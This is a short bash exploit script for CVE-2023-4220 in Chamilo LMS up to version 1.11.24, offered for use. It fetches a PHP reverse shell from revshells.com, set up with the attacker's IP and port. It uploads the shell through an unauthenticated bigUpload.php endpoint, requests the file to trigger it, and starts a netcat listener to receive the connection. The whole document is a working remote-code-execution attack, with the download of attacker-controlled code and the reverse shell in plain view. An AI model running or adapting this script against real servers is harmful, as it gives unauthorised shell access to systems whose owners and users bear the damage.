#!/bin/bash

# Exploit Title : Chamilo LMS CVE-2023-4220 Exploit
# Date : 11/28/2023
# Exploit Author : Ziad Sakr (@Ziad-Sakr) and Enhancements by Divine Clown
# Version : â‰¤v1.11.24
# CVE : 2023-4220
# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2023-4220

# Initialize variables with default values
attacker_ip=""
port=""
host_link=""

# Parse command-line options
while getopts "i:p:h:" opt; do
    case $opt in
        i)
            attacker_ip=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        \?)
            exit 1
            ;;
        :)
            exit 1
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$attacker_ip" ] || [ -z "$port" ] || [ -z "$host_link" ]; then
    exit 1
fi

# Download the reverse shell PHP exploit from revshells.com silently
reverse_file="reverse_shell.php"
exploit_url="https://www.revshells.com/PHP%20PentestMonkey?ip=$attacker_ip&port=$port&shell=bash&encoding=bash"
curl -sL "$exploit_url" -o $reverse_file

# Perform the file upload using curl silently
curl -s -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported" > /dev/null

# Trigger the reverse shell by accessing the uploaded file
curl -s "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" > /dev/null &

# Start the Netcat listener
nc -lnvp $port